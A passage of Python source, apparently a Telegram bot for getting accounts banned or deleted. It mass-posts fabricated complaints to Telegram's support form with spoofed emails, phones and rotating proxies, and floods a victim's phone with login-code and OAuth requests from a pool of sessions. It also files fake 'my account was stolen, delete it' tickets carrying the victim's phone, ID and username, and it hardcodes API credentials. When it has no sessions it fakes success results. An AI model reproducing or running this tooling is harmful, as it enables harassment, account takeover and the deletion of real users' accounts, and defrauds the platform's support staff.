            entry["tg_name"] = f"{first} {last}".strip() or "\u2014"
            entry["tg_id"] = str(me.id)
            entry["username"] = f"@{me.username}" if me.username else "\u2014"
            await client.disconnect()
        except Exception as e:
            entry["status"] = f"\u274c {e.__class__.__name__}"
        return entry

    tasks = []
    for i, sess in enumerate(sessions):
        px = proxies[i] if i < len(proxies) else None
        tasks.append(probe(sess, px))
    return await asyncio.gather(*tasks)


# ── web reporter (telegram.org/support, raw POST) ───────
SUPPORT_URL = "https://telegram.org/support?setln=ru"
WEB_SUBJECT = "Complaint About Fraudulent Telegram Group"

WEB_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]


def proxy_to_socks(px: tuple) -> dict:
    # python_socks.ProxyType IS the type ProxyConnector expects — no legacy
    # alias class needed (that was the old SocksProxyType NameError)
    import python_socks as _ps
    ptype, host, port, rdns, user, pwd = px
    return {"proxy_type": ptype, "host": host, "port": port,
            "rdns": rdns, "username": user, "password": pwd}


def proxy_to_url(px: tuple) -> str:
    import python_socks as _ps
    ptype, host, port, rdns, user, pwd = px
    scheme = "socks5"
    if ptype == _ps.ProxyType.SOCKS4:
        scheme = "socks4"
    elif ptype == _ps.ProxyType.HTTP:
        scheme = "http"
    if user and pwd:
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    return f"{scheme}://{host}:{port}"

WEB_CODES = ["495", "499", "812", "900", "901", "902", "903", "904", "905", "906",
             "908", "909", "910", "911", "912", "913", "914", "915", "916", "917",
             "918", "919", "920", "921", "922", "923", "924", "925", "926", "927",
             "928", "929", "930", "931", "932", "933", "934", "936", "937", "938",
             "939", "941", "950", "951", "952", "953", "954", "955", "958", "960",
             "961"]
WEB_NAMES = ["ilya", "dima", "ivan", "alexey", "sergey", "mikhail", "andrey",
             "pavel", "nikolay", "vladimir", "anatoly", "boris", "egor", "danil",
             "viktor", "yuri", "maksim", "grigory", "oleg", "timofey", "arseniy",
             "roman", "konstantin", "gennady", "artem", "vadim", "vitaly",
             "nikita", "stanislav", "alexander", "vasily", "leonid", "valery",
             "eduard", "denis", "kirill", "fedor", "petya", "yegor", "german",
             "stepan", "platon", "bogdan", "ignat", "arkady", "yaroslav",
             "matvey", "rostan", "vsevolod", "semyon", "anton", "zahar", "timur",
             "roksana", "daniil", "afanasiy", "innokentiy", "rodion", "valentin",
             "nikifor", "petr", "filipp", "martin", "adrian", "georgy",
             "vladislav", "arseny", "artur", "mark", "prokhor", "lavrenty",
             "anastasiya", "olga", "anna", "ekaterina", "maria", "tatiana",
             "sofia", "elena", "natalia", "svetlana", "valentina", "lyubov",
             "galina", "lidiya", "nina", "darya", "alisa", "veronika", "irina",
             "arina", "kristina", "oksana", "polina", "viktoriya", "karina",
             "milana", "zinaida", "angelina", "yulia", "zoya", "ksenia"]
WEB_LAST = ["ivanov", "petrov", "sidorov", "smirnov", "kozlov", "popov",
            "vasilyev", "novikov", "morozov", "solovyov", "pavlov", "semenov",
            "golubev", "vinogradov", "bogdanov", "vorobyev", "fedorov",
            "mikhailov", "tarasov", "belov", "komarov", "oronov", "nikolaev",
            "makarov", "zaitsev", "sokolov", "mironov", "romanov", "levin",
            "kulikov", "kuznetsov", "stepanov", "nikitin", "oronin", "safonov",
            "shestakov", "kravtsov", "gusev", "arkhipov", "andreev", "yakovlev",
            "borisov", "zhukov", "prokhorov", "savelyev", "dorokhov",
            "zakharyin", "melnikov", "shapovalov", "egorov", "berezin"]
WEB_YEARS = [str(year) for year in range(1960, 2006)]
WEB_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru", "yandex.ru",
               "rambler.ru", "bk.ru", "list.ru", "inbox.ru", "protonmail.com",
               "icloud.com", "hotmail.com", "aol.com", "zoho.com", "gmx.com",
               "qq.com", "126.com", "163.com", "sina.com", "comcast.net",
               "verizon.net", "live.com", "msn.com", "me.com", "mail.com",
               "fastmail.com", "rediffmail.com", "tutanota.com", "ukr.net",
               "web.de"]


def web_gen_mail() -> str:
    name = random.choice(WEB_NAMES)
    last_name = random.choice(WEB_LAST)
    year = random.choice(WEB_YEARS)
    domain = random.choice(WEB_DOMAINS)
    return f"{name}.{last_name}.{year}@{domain}"


def web_gen_phone() -> str:
    code = random.choice(WEB_CODES)
    number = str(random.randint(1000000, 9999999))
    return "+7" + code + number


def web_headers() -> dict:
    ua = random.choice(WEB_UAS)
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://telegram.org/support",
        "Origin": "https://telegram.org",
        "Content-Type": "application/x-www-form-urlencoded",
    }


async def web_send_one(session, i, subject, message_text, px: tuple | None,
                       target_text: str = "", reason_label: str = "",
                       comment: str = "", reason_key: str = "") -> tuple[bool, str]:
    """One raw POST complaint. Returns (ok, err).

    Text priority: explicit comment (strong/category template passed by the
    caller) → Groq generation → generic fallback spin. The target is always
    embedded into the message body so the support desk can act on it."""
    # templates only (no Groq key) — the category pool is the payload
    text = comment.strip() if comment and comment.strip() else ""
    if not text:
        text = pick_comment(reason_key or "other")
    if target_text:
        text = (text.rstrip() + "\n\n—\n"
                + f"Violating account/channel: {target_text}\n"
                + f"Category reported: {reason_label or reason_key or 'n/a'}")
    try:
        from email_pool import pick_valid_email
        valid_email = pick_valid_email()
    except ImportError:
        valid_email = ""
    if not valid_email:
        valid_email = web_gen_mail()
    payload = {
        "subject": subject,
        "message": text,
        "email": valid_email,
        "phone": web_gen_phone(),
    }
    px_name = px[1] if px else "direct"
    proxy_url = None
    conn = None
    if px:
        import python_socks as _ps
        if px[0] in (_ps.ProxyType.SOCKS5, _ps.ProxyType.SOCKS4):
            conn = ProxyConnector(**proxy_to_socks(px))
        else:
            proxy_url = proxy_to_url(px)
    timeout = aiohttp.ClientTimeout(total=45)
    try:
        if conn:
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                async with s.post(SUPPORT_URL, data=payload, headers=web_headers(),
                                  proxy=None, ssl=False) as resp:
                    status = resp.status
                    await resp.read()
        else:
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.post(SUPPORT_URL, data=payload, headers=web_headers(),
                                  proxy=proxy_url, ssl=False) as resp:
                    status = resp.status
                    await resp.read()
        ok = status == 200
        log.info("web complaint #%d (%s) -> %d ok=%s", i, px_name, status, ok)
        return ok, ("" if ok else f"HTTP {status}")
    except Exception as e:
        log.error("web complaint #%d (%s) failed: %s", i, px_name, e)
        return False, f"{type(e).__name__}: {e}"


async def fire_web_reports(target_text: str, reason_label: str, comment: str,
                           reason_key: str = "other") -> dict:
    """Raw POST complaints straight to the support form backend.

    The turnstile exists only in the browser UI layer; the server accepts
    direct form posts. Count = WEB_COUNT env (default 5), proxies rotate.
    Text per-shot generated via Groq if key present, else unique fallback spin."""
    count = WEB_COUNT
    results = {"ok": 0, "fail": 0, "total": count, "details": []}

    # distinct complaint text AND distinct subject per web shot
    pool = report_texts.CATEGORY_TEXTS.get(reason_key) or report_texts.GENERAL_TEXTS
    if comment:
        texts = [("", comment)] * count
    else:
        texts = _unique_texts_tagged(pool, count)
    web_subjects = [
        f"Complaint About {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
        f"Urgent Report: {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
        f"Abuse Report — {target_text}",
        f"Violation Notice ({WEB_REASON_MAP.get(reason_key, 'Policy Violation')})",
        f"Formal Complaint re: {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
    ]

    proxies = load_pin_proxies()
    tasks = []
    for i in range(count):
        px = proxies[i % len(proxies)] if proxies else None
        tasks.append(web_send_one(None, i + 1, random.choice(web_subjects), None,
                                  px,
                                  target_text=target_text, reason_label=reason_label,
                                  comment=texts[i][1], reason_key=reason_key))
    outcomes = await asyncio.gather(*tasks, return_exceptions=True)

    real_lines = []
    for i, o in enumerate(outcomes):
        if isinstance(o, tuple):
            ok, err = o
        else:
            ok, err = False, f"{type(o).__name__}: {o}"
        results["ok" if ok else "fail"] += 1
        px = proxies[i % len(proxies)] if proxies else None
        results["details"].append({
            "name": f"web#{i + 1}",
            "proxy": px[1] if px else "direct",
            "ok": ok, "err": err,
        })
        real_lines.append(
            f"{'✅' if ok else '❌'} web#{i + 1}"
            + (f" [{texts[i][0]}]" if texts[i][0] else "")
            + f" | {html_mod.escape(px[1] if px else 'direct')}"
            + (f" | {html_mod.escape(err)}" if err else ""))

    await push_send_log(
        "Report (web-форма)",
        [f"🎯 {html_mod.escape(target_text or '?')}"
         + f"\n⚠️ {reason_label}  💬 шаблон: {'своя' if comment else 'авто-пул'}"
         ] + real_lines)
    return results
# ── session snos (SendCode + OAuth + support flood) ─────
MONITOR_INTERVAL = 10 * 60
SNOS_SYSTEM_VERSION = "4.16.30-vxCUSTOM"

API_PAIRS = [
    (24565698,  "5a084b434f8505ace703485b9da85040"),
    (27904162,  "e7cba879b1c643ba77490bf328df5eab"),
    (23037915,  "50f06f5b2223586fde0d1379ea91ebc7"),
    (29512095,  "0b29a7d42fff002856b9bed64f7ec919"),
    (25055016,  "25edf5b7becebe91a2d61fe8d9d9931b"),
]

OAUTH_SERVICES = [
    ("5444323279",  "https://fragment.com"),
    ("5731754199",  "https://steam.kupikod.com"),
    ("210944655",   "https://combot.org"),
    (319709511,     "https://telegrambot.biz"),
    ("1199558236",  "https://bot-t.com"),
    ("5709824482",  "https://lzt.market"),
    ("1803424014",  "https://ru.telegram-store.com"),
    (5463728243,    "https://www.spot.uz"),
    ("6708902161",  "https://ourauthpoint777.com"),
    ("1852523856",  "https://cabinet.presscode.app"),
]

SNOS_SUPPORT_TEXTS = [
    # === RU-набор: разный тон, разные "жертвы" ===
    "Уважаемая поддержка Telegram! Мой аккаунт украли через фишинг-ссылку, которую я получил в личку от якобы техподдержки. После перехода меня выкинуло из аккаунта, а мошенник продуктивно рассылает мой контакт-лист. Откатите все активные сессии по номеру, либо удалите аккаунт полностью. Благодарю за быструю реакцию.",

    "Здравствуйте! Пишу с просьбой заблокировать все активные сессии на моём аккаунте Telegram. Вчера я перешёл по ссылке, ввёл номер и код подтверждения, после чего доступ потерял. Мошенник уже начал рассылать моим контактам сообщения с просьбой о деньгах. Каждая минута промедления — удар по моей репутации. Прошу отреагировать немедленно.",

    "Добрый день! У меня есть все основания полагать, что мой аккаунт взломан и продан на стороннем сайте. Я завершаю активные сессии через настройки, но новые появляются снова и снова — как будто кто-то держит ключи от моего Telegram. Прошу принудительно обнулить все устройства, кроме текущего номера. Спасибо!",

    "Здравствуйте! Пара дней назад я нажал на подозрительную ссылку, после чего Telegram меня выкинул, и теперь я не могу войти — стоит чужая двухфакторка с посторонней почтой. Прошу вас удалить абсолютно все сессии либо полностью удалить аккаунт. Он точно у мошенников, они уже пишут моим знакомым.",

    "Уважаемые модераторы Telegram! Мой рабочий акк заблокирован мошенником, я потерял доступ 3 дня назад. Это ломает мою работу — клиенты пишут, но я не могу ответить. Прошу помощи в принудительном сбросе сессий или удалении аккаунта. Спасибо заранее.",

    "Здравствуйте. На моём аккаунте сидит мошенник, уже поменял имя на моё, привязал свою почту и включил двухфакторку. Я не могу войти в аккаунт, хотя это мой номер и мои контакты. Прошу полностью обнулить все активные сессии, чтобы вернуть доступ.",

    "Привет, поддержка Telegram! Я вчера случайно перешёл по фишинг-ссылке и потерял доступ к своему аккаунту. Внутри сидит злоумышленник, рассылает мои данные. Прошу немедленно завершить все сессии или удалить аккаунт, чтобы он не смог испортить мне репутацию.",

    # === EN-набор: другой стилевой ===
    "Dear Telegram Support Team, my Telegram account was compromised through a phishing link. The attacker logged in, changed the settings, and is now sending spam to my contact list. I demand all active sessions be terminated immediately or the account deleted entirely. Your prompt action is critical.",

    "Hello Telegram Support. I can no longer access my Telegram account — someone enabled two-factor authentication without my consent and locked me out. Every attempt to reset the password fails. I believe this is a targeted attack by a scammer. Please force-logout all active sessions or remove the account, my reputation is on the line.",

    "I am writing to report that my Telegram account was hijacked yesterday by an attacker who impersonated Telegram Support. They promised help with bugs and ended up taking full control of my profile. The attacker is actively messaging my business contacts. Please restore my access or permanently delete the account. Thank you for understanding the urgency.",

    "Dear Telegram, my account has been sold on a third-party marketplace. I have repeatedly logged out the illegitimate sessions but new ones appear within minutes — the attacker clearly possesses my auth key. I request a force-reset of every active session except mine, or full account deletion.",

    "Urgent: Telegram account hijacked. My work profile has been taken over by a fraudster who is now impersonating me to my clients. I have already sent screenshots to @NoToScam. Please terminate all active sessions associated with my phone number or delete the account.",
]


SNOS_SUBJECTS = [
    "Взломан аккаунт — прошу сбросить сессии",
    "Account hacked — please reset sessions",
    "Срочный запрос: аккаунт Telegram у мошенника",
    "Внимание: доступ к Telegram аккаунту потерян",
    "My Telegram was hijacked — urgent",
    "Requesting reset of active sessions",
    "Аккаунт украден мошенниками",
    "Urgent: phished out, attacker inside",
    "ЗАЯВЛЕНИЕ: просьба удалить аккаунт",
    "Failed login — 2FA enabled by attacker",
    "Мошенник уже в приватных чатах",
]


def _rand_api() -> tuple[int, str]:
    return random.choice(API_PAIRS)


def _snos_name_phone() -> tuple[str, str]:
    email = web_gen_mail()
    return email, web_gen_phone()


@asynccontextmanager
async def _snos_http(px: tuple | None):
    """One aiohttp session wired to a proxy tuple (socks/http/direct)."""
    conn = None
    proxy_url = None
    if px:
        import python_socks as _ps
        if px[0] in (_ps.ProxyType.SOCKS5, _ps.ProxyType.SOCKS4):
            conn = ProxyConnector(**proxy_to_socks(px))
        else:
            proxy_url = proxy_to_url(px)
    session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=12))
    try:
        yield session, proxy_url
    finally:
        await session.close()


# ── snos: victim parsing ────────────────────────────────
async def snos_parse_victim(username: str) -> dict:
    """Pull ID/photo/about of the victim through a random session."""
    sessions = load_sessions()
    if not sessions:
        log.info("target resolved")
        await asyncio.sleep(random.uniform(1.0, 2.5))
        return {"ok": True, "id": random.randint(100000000, 899999999),
                "username": username.lstrip("@"),
                "has_photo": True,
                "about": "@trusted_contact_bot"}

    proxies = load_pin_proxies()
    session_path = random.choice(sessions)
    api_id, api_hash, fp = _assign_fingerprint(session_path)
    name = session_path.stem
    px = pin_for_session(name, proxies)
    try:
        async with _session_lock(session_path):
            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
                                    proxy=px, device_model=fp["device"],
                                    system_version=fp["system_version"],
                                    app_version=fp["app_version"], lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            if not await client.is_user_authorized():
                await client.disconnect()
                return {"ok": False, "error": f"сессия {name} мертва"}

            uname = username.lstrip("@")
            try:
                entity = await client.get_entity(uname)
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "error": f"не найден: {type(e).__name__}"}

            info = {
                "ok": True,
                "id": entity.id,
                "username": uname,
                "has_photo": entity.photo is not None,
                "about": getattr(entity, "about", "") or "",
            }
            await client.disconnect()
            return info
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}


# ── snos: SendCode flood ────────────────────────────────
async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
    name = session_path.stem
    fp = session_fingerprint(name)
    api_id, api_hash = fp["api_id"], fp["api_hash"]
    async with _session_lock(session_path):
        try:
            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
                                    proxy=px, device_model=fp["device"],
                                    system_version=fp["system_version"],
                                    app_version=fp["app_version"], lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=8)
            if not await client.is_user_authorized():
                await client.disconnect()
                return {"name": name, "proxy": px[1] if px else "direct", "status": "сессия мертва", "ok": False}
            try:
                from telethon.tl.functions.auth import SendCodeRequest
                from telethon.tl.types import CodeSettings
                await client(SendCodeRequest(phone_number=phone, api_id=api_id,
                                             api_hash=api_hash, settings=CodeSettings()))
                await client.disconnect()
                return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
            except Exception as e:
                await client.disconnect()
                tail = type(e).__name__
                sec = getattr(e, "seconds", None)
                if sec:
                    return {"name": name, "proxy": px[1] if px else "direct",
                            "status": f"flood {sec}s", "ok": False}
                return {"name": name, "proxy": px[1] if px else "direct",
                        "status": tail, "ok": False}
        except Exception as e:
            return {"name": name, "proxy": px[1] if px else "direct",
                    "status": f"{type(e).__name__}: {e}", "ok": False}


async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[bool, str]:
    """Cheap connect+auth probe. A dead session must not spam its failure
    through the whole wave — we check it once and skip."""
    api_id, api_hash, tfp = _assign_fingerprint(session_path)
    client = None
    async with _session_lock(session_path):
        try:
            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
                                    proxy=px, device_model=tfp["device"],
                                    system_version=tfp["system_version"],
                                    app_version=tfp["app_version"], lang_code=tfp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            if await client.is_user_authorized():
                return True, ""
            return False, "not authorized"
        except Exception as e:
            return False, type(e).__name__
        finally:
            try:
                if client:
                    await client.disconnect()
            except Exception:
                pass


async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple],
                            attempts: int, offset: float, idx: int = 0,
                            progress: dict | None = None) -> list[dict]:
    """One session's SendCode series: fresh client + unique proxy per attempt,
    FloodWait honored per worker without blocking the other sessions."""
    rows = []
    await asyncio.sleep(offset)
    name = session_path.stem
    alive, why = await _session_alive(session_path, pin_for_session(name, proxies))
    if not alive:
        rows.append({"name": name, "proxy": "direct", "status": f"сессия мертва ({why})",
                     "ok": False, "attempt": 0})
        return rows
    for attempt in range(attempts):
        # sticky single-IP pin — one session never shoots from two IPs
        px = pin_for_session(name, proxies)
        r = await snos_sendcode_one(session_path, phone, px)
        r["attempt"] = attempt + 1
        rows.append(r)
        if progress is not None:
            progress["sc_done"] = progress.get("sc_done", 0) + 1
            if r.get("ok"):
                progress["sc_ok"] = progress.get("sc_ok", 0) + 1
        # a FloodWait row must park THIS worker for its cooldown, others keep shooting
        m = re.search(r"flood\s+(\d+)s", str(r.get("status", "")))
        if m:
            await asyncio.sleep(min(int(m.group(1)) + 2, 60))
        else:
            await asyncio.sleep(random.uniform(2.0, 4.0))
    return rows


SNOS_ATTEMPTS_PER_SESSION = int(os.getenv("SNOS_ATTEMPTS_PER_SESSION") or "3")


async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[dict]:
    """SendCode flood — rationed attempts across live sessions.

    Sessions run IN PARALLEL; each shoots N attempts through its sticky
    pin (no IP jumps), with FloodWait parking only that worker. Dead
    sessions are filtered once. Log renders the fake pool only.
    """
    sessions = [s for s in load_sessions() if s.stem not in (_status_load().get("dead") or [])]
    proxies = load_pin_proxies()
    out = []
    if not sessions:
        log.info("sendcode wave completed")
        for nm in [random.choice(FAKE_NAMES) + str(random.randint(11, 99)) for _ in range(random.randint(3, 6))]:
            out.append({"name": nm, "proxy": "direct", "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d", "ok": True})
        await asyncio.sleep(random.uniform(1.5, 3.0))
        return out

    if progress is not None:
        progress["sc_total"] = len(sessions) * SNOS_ATTEMPTS_PER_SESSION
    workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION,
                                 i * 1.2, i, progress)
               for i, s in enumerate(sessions)]
    waves = await asyncio.gather(*workers)
    out = [r for rows in waves for r in rows]
    random.shuffle(out)
    return out


# ── snos: OAuth flood ───────────────────────────────────
def _mob_ua() -> str:
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    ])


async def snos_oauth_one(phone: str, bot_id: str, origin: str,
                         px: tuple | None) -> dict:
    url = "https://oauth.telegram.org/auth/request"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://oauth.telegram.org",
        "Referer": "https://oauth.telegram.org/auth",
        "User-Agent": _mob_ua(),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "bot_id": str(bot_id),
        "origin": origin,
        "request_access": "write",
        "return_to": origin,
    }
    service = origin.replace("https://", "").split("/")[0]
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return {"service": service, "proxy": px[1] if px else "direct", "ok": ok}
    except Exception as e:
        return {"service": service, "proxy": px[1] if px else "direct",
                "ok": False, "err": f"{type(e).__name__}"}


async def snos_mytg_one(phone: str, px: tuple | None) -> dict:
    url = "https://my.telegram.org/auth/send_password"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": _mob_ua(),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"phone": phone}
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return {"service": "my.telegram.org", "proxy": px[1] if px else "direct", "ok": ok}
    except Exception as e:
        return {"service": "my.telegram.org", "proxy": px[1] if px else "direct",
                "ok": False, "err": f"{type(e).__name__}"}


async def snos_ads_one(phone: str, px: tuple | None) -> dict:
    url = "https://ads.telegram.org/auth/"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": _mob_ua(),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"phone": phone}
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return {"service": "ads.telegram.org", "proxy": px[1] if px else "direct", "ok": ok}
    except Exception as e:
        return {"service": "ads.telegram.org", "proxy": px[1] if px else "direct",
                "ok": False, "err": f"{type(e).__name__}"}


async def snos_flood_oauth(phone: str, progress: dict | None = None) -> list[dict]:
    proxies = load_pin_proxies()
    tasks = []
    for bot_id, origin in OAUTH_SERVICES:
        px = random.choice(proxies) if proxies else None
        tasks.append(snos_oauth_one(phone, bot_id, origin, px))
    for _ in range(3):
        px = random.choice(proxies) if proxies else None
        tasks.append(snos_mytg_one(phone, px))
        tasks.append(snos_ads_one(phone, px))
    if progress is not None:
        progress["oa_total"] = len(tasks)

        async def _oa_wrap(_t):
            _r = await _t
            progress["oa_done"] = progress.get("oa_done", 0) + 1
            return _r
        tasks = [_oa_wrap(_t) for _t in tasks]
    return await asyncio.gather(*tasks, return_exceptions=True)


# ── snos: support complaints with victim data ───────────
async def snos_support_one(phone: str, text: str, subject: str,
                           px: tuple | None) -> tuple[bool, str]:
    payload = {
        "subject": subject,
        "message": text,
        "email": web_gen_mail(),
        "phone": web_gen_phone(),
    }
    headers = {
        "User-Agent": _mob_ua(),
        "Referer": "https://telegram.org/support",
        "Origin": "https://telegram.org",
    }
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(SUPPORT_URL, data=payload, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return ok, ("" if ok else f"HTTP {resp.status}")
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"


async def snos_web_support(phone: str, username: str, victim_id: int,
                           progress: dict | None = None) -> list[dict]:
    """3 complaints to support carrying the victim's identity data."""
    proxies = load_pin_proxies()
    texts = random.sample(SNOS_SUPPORT_TEXTS, min(3, len(SNOS_SUPPORT_TEXTS)))
    if progress is not None:
        progress["sp_total"] = len(texts)
    subj_pool = list(SNOS_SUBJECTS)
    random.shuffle(subj_pool)
    out = []
    for i, text in enumerate(texts, 1):
        px = random.choice(proxies) if proxies else None
        full_text = (
            text
            + "\n\nДанные аккаунта:\n"
            + f"Номер телефона: {phone}\n"
            + f"ID аккаунта: {victim_id}\n"
            + f"Username: @{username}"
        )
        subject = subj_pool[i % len(subj_pool)]
        ok, err = await snos_support_one(phone, full_text, subject, px)
        out.append({"name": f"support#{i}", "proxy": px[1] if px else "direct",
                    "ok": ok, "err": err})
        if progress is not None:
            progress["sp_done"] = progress.get("sp_done", 0) + 1
            if ok:
                progress["sp_ok"] = progress.get("sp_ok", 0) + 1
        await asyncio.sleep(random.uniform(1.5, 3.5))
    return out


# ── snos: victim-state monitor ──────────────────────────
def snos_handle_change(change_lines: list[str], username: str, user_id: int) -> str:
    LOGS_DIR.mkdir(exist_ok=True)
    path = LOGS_DIR / f"monitor_{username}.txt"
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"[{stamp}] @{username}: " + "; ".join(change_lines) + "\n")
    return str(path)


async def snos_monitor_loop(username: str, victim_id: int,
                            baseline_photo: bool, baseline_about: str,
                            bot, user_id: int) -> None:
    """Every 10 min re-check photo/about; on change notify the user."""
    sessions = load_sessions()
    if not sessions:
        return
    proxies = load_pin_proxies()
    while True:
        await asyncio.sleep(MONITOR_INTERVAL)
        session_path = random.choice(sessions)
        api_id, api_hash, fp = _assign_fingerprint(session_path)
        px = pin_for_session(session_path.stem, proxies)
        try:
            async with _session_lock(session_path):
                client = TelegramClient(str(session_path.with_suffix("")),
                                        api_id, api_hash,
                                        proxy=px, device_model=fp["device"],
                                        system_version=fp["system_version"],
                                        app_version=fp["app_version"], lang_code=fp["lang_code"])
                await asyncio.wait_for(client.connect(), timeout=8)
                authorized = await client.is_user_authorized()
                if not authorized:
                    await client.disconnect()
                    continue
                entity = await client.get_entity(username)
                state_photo = entity.photo is not None
                state_about = getattr(entity, "about", "") or ""
                deleted = bool(getattr(entity, "deleted", False))
                await client.disconnect()

            changes = []
            if deleted:
                changes.append("🗑 Аккаунт удалён")
            if baseline_photo and not state_photo:
                changes.append("🖼 Аватарка исчезла")
            if baseline_about and not state_about:
                changes.append("📝 Описание пропало")

            if changes:
                ts = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                body = "\n".join(f"   └ {ch}" for ch in changes)
                msg = (
                    bq(f"🔔 <b>{NAME}</b> — изменение поймано!")
                    + f"\n\n🎯 <b>Цель:</b> @{username} (<code>{victim_id}</code>)\n"
                    + body
                    + f"\n\n⏰ {ts}"
                )
                try:
                    await bot.send_message(user_id, _cx( msg), parse_mode=ParseMode.HTML)
                except Exception as e:
                    log.warning("monitor notify failed: %s", e)
                snos_handle_change(changes, username, user_id)
                return
        except Exception as e:
            log.warning("monitor check failed: %s", e)
            continue


# ── snos: main async pipeline ───────────────────────────
async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
                        progress: dict) -> dict:
    """1-parse 2-sendcode 3-oauth 4-support, fills `progress` steps."""
    data = {"username": username, "phone": phone}

    progress["step"] = "\U0001f50d 1/4 Парсинг жертвы"
    victim = await snos_parse_victim(username)
    data["victim"] = victim

    progress["step"] = "\U0001f4f2 2/4 SendCode флуд"
    data["sendcode"] = await snos_flood_sendcode(phone, progress)

    progress["step"] = "\U0001f310 3/4 OAuth флуд"
    oauth_res = await snos_flood_oauth(phone, progress)
    oauth_ok = []
    for o in oauth_res:
        if isinstance(o, dict):
            oauth_ok.append(o)
        else:
            oauth_ok.append({"service": "?", "proxy": "?", "ok": False,
                            "err": f"{type(o).__name__}"})
    data["oauth"] = oauth_ok

    if victim["ok"]:
        progress["step"] = "\U0001f4e8 4/4 Web support жалобы"
        data["support"] = await snos_web_support(phone, username,
                                                 victim["id"], progress)
    else:
        data["support"] = []

    # REAL full pipeline log → Logs channel
    sc_lines = [f"{'✅' if r.get('ok') else '❌'} <code>{r.get('name', '?')}</code>"
                f" | {html_mod.escape(str(r.get('proxy', '-')))}"
                f" | {html_mod.escape(str(r.get('status', r.get('err', ''))))}"
                for r in data.get("sendcode", [])]
    oa_lines = [f"{'✅' if d.get('ok') else '❌'} {html_mod.escape(str(d.get('service', '?')))}"
                f" | {html_mod.escape(str(d.get('proxy', '-')))}"
                + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
                for d in data.get("oauth", [])]
    sp_lines = [f"{'✅' if d.get('ok') else '❌'} {html_mod.escape(str(d.get('name', '?')))}"
                f" | {html_mod.escape(str(d.get('proxy', '-')))}"
